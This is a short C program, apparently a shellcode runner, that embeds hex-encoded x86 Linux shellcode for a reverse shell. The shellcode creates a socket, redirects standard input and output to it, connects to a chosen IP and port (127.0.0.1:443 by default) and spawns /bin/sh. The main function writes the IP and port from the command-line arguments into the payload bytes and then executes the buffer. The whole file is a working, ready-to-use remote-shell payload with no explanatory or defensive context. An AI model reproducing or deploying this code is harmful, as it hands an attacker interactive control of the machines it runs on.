#include<stdio.h>
#include<string.h>



unsigned char code[] ="\x31\xc0\x50\x40\x50\x89\xc3\x40\x50\x89\xe1\xb0\x66\xcd\x80\x89\xc3\xb9\x03\x00\x00\x00\xb0\x3f\x49\xcd\x80\x75\xf9\x68\x7f\x00\x00\x01\x68\x02\x00\x01\xbb\x89\xe1\x6a\x66\x51\x53\x89\xe1\xb3\x03\xb0\x66\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

main(int argc, char *argv[])
{
	if(argc > 2){
		printf("ip add: %s\n", argv[1]);
		unsigned int  addr = inet_addr(argv[1]);
		unsigned short portnum = htons(atoi(argv[2]));
		printf("%d\n", portnum);
		memcpy(&code[30] , &addr,4);
		memcpy(&code[37], &portnum , 2);
		printf("%x", code[30]);
	}else{
		printf("please input ip address and port.\n %s <ip> <port>\n", argv[0]);
		exit(1);
	}

//	printf("%x" , htons(443));
//	printf("%x" , inet_addr("127.0.0.1"));
	printf("Shellcode Length:  %d\n", sizeof(code));
	(*(void  (*)()) code)();
	//void (*ret)() = (void(*)())code;

	//ret();

}


